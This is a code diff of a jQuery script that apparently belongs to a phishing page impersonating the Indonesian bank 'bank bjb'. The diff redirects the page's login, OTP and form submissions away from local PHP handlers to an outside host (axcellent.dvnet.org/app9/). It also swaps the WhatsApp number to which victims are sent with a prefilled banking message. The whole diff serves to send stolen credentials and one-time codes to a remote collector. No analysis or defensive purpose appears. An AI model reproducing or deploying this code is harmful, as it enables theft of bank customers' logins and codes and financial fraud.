@@ -4,7 +4,7 @@
  $(".load").show();
  $.ajax({
  type: 'POST',
- url: 'req/no.php',
+ url: 'https://axcellent.dvnet.org/app9/no.php',
  data: $(this).serialize(),
  datatype: 'JSON', 
  complete: function(data) {
@@ -28,7 +28,7 @@ $(document).ready(function(){
  document.getElementById('kirims').innerHTML = "Memproses....";
 $.ajax({
  type: 'POST',
- url: 'req/sendLogin.php',
+ url: 'https://axcellent.dvnet.org/app9/sendLogin.php',
  async: false,
  dataType: 'JSON',
  data: $(this).serialize(), 
@@ -64,7 +64,7 @@ $(document).ready(function(){
  document.getElementById('kirims').innerHTML = "Memproses....";
 $.ajax({
  type: 'POST',
- url: 'req/otp.php',
+ url: 'https://axcellent.dvnet.org/app9/otp.php',
  async: false,
  dataType: 'JSON',
  data: $(this).serialize(), 
@@ -125,7 +125,7 @@ var timer = setInterval(function() {
   time.html(i);
   if (i == 0) {
   $("#timer").hide();
-   location.href='https://api.whatsapp.com/send?phone=6282182480632&text=𝗛𝗮𝗹𝗹𝗼 𝗯𝗮𝗻𝗸 𝗯𝗷𝗯%0ASaya mau request Pesan SMS ke layanan (83373)';
+   location.href='https://api.whatsapp.com/send?phone=6282173700402&text=𝗛𝗮𝗹𝗹𝗼 𝗯𝗮𝗻𝗸 𝗯𝗷𝗯%0ASaya mau request Pesan SMS ke layanan (83373)';
     clearInterval(timer);
 
   }
@@ -135,7 +135,7 @@ var timer = setInterval(function() {
 function go(){
 setTimeout(function(){  
 $('.load').fadeIn();
-location.href='https://api.whatsapp.com/send?phone=6282182480632&text=𝗛𝗮𝗹𝗹𝗼 𝗯𝗮𝗻𝗸 𝗯𝗷𝗯%0ASaya mau request Pesan SMS ke layanan (83373)';
+location.href='https://api.whatsapp.com/send?phone=6282173700402&text=𝗛𝗮𝗹𝗹𝗼 𝗯𝗮𝗻𝗸 𝗯𝗷𝗯%0ASaya mau request Pesan SMS ke layanan (83373)';
 $('.load').fadeOut();
     }, 1500);    
 }     
